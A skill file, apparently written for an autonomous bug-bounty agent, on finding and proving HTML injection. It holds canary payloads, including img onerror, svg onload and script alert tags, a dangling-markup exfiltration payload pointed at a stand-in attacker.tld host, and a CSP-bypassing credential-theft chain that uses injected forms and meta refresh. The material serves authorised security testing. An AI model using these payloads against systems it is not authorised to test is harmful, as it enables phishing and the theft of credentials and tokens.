---
name: hunt-html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
sources: hackerone_public, public_research
report_count: 7
---

## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

## Credential Theft Through HTML Injection Even Under a Strict CSP (`form-action` + meta-refresh gadget)

Don't stop testing just because the target has a strict `Content-Security-Policy` that blocks every script source — HTML injection alone (no JS execution at all) can still steal submitted credentials, because `form-action` and `<meta>` navigation are two primitives CSP's `script-src`/`default-src` do **not** cover unless explicitly set.

- **Precondition:** an unescaped HTML injection point (same as above), and a CSP that either has no `form-action` directive (it does **not** inherit from `default-src`) or sets `form-action 'self'`.
- **Stage 1 — inject a credential-harvesting form with no `action`.** A form with no `action` attribute submits back to the *same* page via GET, which `form-action 'self'` (or an unset `form-action`) permits even when `script-src`/`default-src` is locked to `'none'`. Add a same-named `<textarea>` holding your stage-2 payload so it rides along as a query param when the victim submits their username/password.
- **Stage 2 — reflect the payload as live markup.** If the same injection point reflects the submitted query string back into the page, your stage-2 payload (now containing the credentials) renders. Use `<meta name=referrer content=unsafe-url>` to force the browser to send the **full URL** — including the credentials now sitting in the query string — in the `Referer` header, then `<meta http-equiv=refresh content="0;url=https://attacker.tld">` to navigate there. No `<script>` tag, no event handler, no CSP violation: the attacker's server simply reads the credentials out of the incoming `Referer` header.
- **Why CSP doesn't stop this:** no JavaScript executes at any point — `form-action` governs only where forms submit (and is commonly left unset or scoped `'self'` since it's considered "low risk"), and `<meta>`-driven navigation/referrer-policy is not a script-src-governed primitive.
- **When a script-src gadget is available instead:** if the CSP's allow-listed script hosts include a JSONP endpoint or an outdated library (old AngularJS builds are a classic host-based CSP bypass gadget), you can skip the form-action route and inject a `<script src>` pointing at that allow-listed host to execute JS directly under the policy.
- **Report framing:** a "CSP is correctly configured, blocks XSS" finding is incomplete if you haven't tried a form-action-only chain — note explicitly in the write-up that CSP presence does not equal credential-theft immunity, and recommend the target set `form-action 'none'` (or a tight allow-list) rather than relying on `default-src` to cover it.
- Source: https://portswigger.net/research/blind-trust-stealing-credentials-through-csp (PortSwigger Research, Nov 2026).

See `hunt-xss` → **Bypass Techniques → CSP Bypass** for the script-src gadget-hunting side of this (JSONP endpoints, vulnerable allow-listed libraries, `<base>`-tag redirection).
